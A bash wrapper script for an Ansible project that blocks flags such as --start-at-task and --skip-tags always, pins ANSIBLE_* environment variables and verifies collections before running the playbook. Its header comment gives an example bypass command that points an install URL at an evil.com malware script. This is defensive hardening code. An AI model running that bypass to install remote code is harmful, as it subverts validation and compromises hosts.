#!/usr/bin/env bash
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   3. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   4. roles/claude/tasks/main.yml has no-tag defense-in-depth assertion (role layer)

set -euo pipefail

# Collect all command-line arguments after the script name
args=("$@")

# Reject specific dangerous flags only
# NOTE: --tags and --skip-tags are NOT blocked globally — they're needed for role-specific
# make targets (make claude, make system, etc.). Only --start-at-task and --skip-tags always
# are blocked, as they specifically bypass pre-flight security checks.
for arg in "${args[@]}"; do
    # Block --start-at-task: skips pre_tasks entirely, bypassing all Play 0 security checks
    if [[ "$arg" == '--start-at-task' || "$arg" == --start-at-task=* || "$arg" == '--start-task' ]]; then
        cat >&2 <<EOF
ERROR: --start-at-task rejected by VERIFY_AND_RUN
Reason: --start-at-task skips pre_tasks (even with tags: [always] on Play 0),
        allowing bypass of ALL 83+ security assertions in pre_flight_checks.yml.

SECURITY RISK: Enables attacker to inject malicious values via -e without validation.
Solution: Use a scoped make target instead (make claude, make packages, make ssh, etc.)
EOF
        exit 1
    fi
    # Block --skip-tags=always (single-arg form with =)
    if [[ "$arg" == '--skip-tags=always' ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags=always rejected by VERIFY_AND_RUN
Reason: --skip-tags always skips Play 0 entirely, bypassing collection verification
        and all security assertions tagged [always] in pre_flight_checks.yml.
Solution: Do not use --skip-tags always with site.yml.
EOF
        exit 1
    fi
done

# Check for space-separated --skip-tags always (two separate args: --skip-tags <value>)
# This requires scanning consecutive arg pairs since the loop above only sees individual args.
for ((i=0; i<${#args[@]}-1; i++)); do
    if [[ "${args[$i]}" == '--skip-tags' && "${args[$((i+1))]}" == 'always' ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags always rejected by VERIFY_AND_RUN
Reason: --skip-tags always skips Play 0 entirely, bypassing collection verification
        and all security assertions tagged [always] in pre_flight_checks.yml.
Solution: Do not use --skip-tags always with site.yml.
EOF
        exit 1
    fi
done

# Override critical ANSIBLE_* env vars to always use verified repo values.
# Stronger than validation: SET known-safe values; callers cannot inject via environment.
# Covers the four highest-impact override vectors:
#   ANSIBLE_CONFIG             — could replace all plugin paths + vault_password_file via evil cfg
#   ANSIBLE_VAULT_PASSWORD_FILE — could redirect vault decryption to an exfiltration script
#   ANSIBLE_COLLECTIONS_PATH   — could load malicious collections (role 0 code execution)
#   ANSIBLE_ROLES_PATH         — could load malicious roles (arbitrary become code execution)
_repo_root="$(cd "$(dirname "$0")/.." && pwd)"
export ANSIBLE_CONFIG="${_repo_root}/ansible.cfg"
export ANSIBLE_VAULT_PASSWORD_FILE="${_repo_root}/scripts/vault-pass.sh"
export ANSIBLE_COLLECTIONS_PATH="${_repo_root}/collections:${HOME}/.ansible/collections:/usr/share/ansible/collections"
export ANSIBLE_ROLES_PATH="${_repo_root}/roles:${HOME}/.ansible/roles:/etc/ansible/roles"

# Verify collections integrity (defense-in-depth: supply chain verification)
"${_repo_root}/scripts/verify-collections.sh"

# All checks passed — exec the remaining arguments (ansible-playbook or molecule with its args).
# Using exec replaces this script's process with the command, preserving exit codes and
# signals. The Makefile uses: scripts/verify-ansible-args.sh ansible-playbook site.yml ...
# which passes the full command as $@.
if [[ ${#args[@]} -gt 0 ]]; then
    exec "${args[@]}"
fi
